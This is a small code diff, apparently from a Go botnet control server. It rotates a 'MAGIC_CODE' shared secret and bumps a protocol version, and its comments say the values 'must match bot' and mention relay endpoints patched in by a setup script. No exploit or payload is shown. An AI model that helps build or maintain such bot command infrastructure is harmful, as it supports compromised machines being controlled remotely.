@@ -41,8 +41,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "aq7j6KK4O&iUoYTk"
-	PROTOCOL_VERSION = "V4_3"
+	MAGIC_CODE       = "jWwk&7Zfo&dHPbvB"
+	PROTOCOL_VERSION = "v5.9"
 )
 
 // bakedRelayEndpoints holds relay addresses patched in by setup.py.
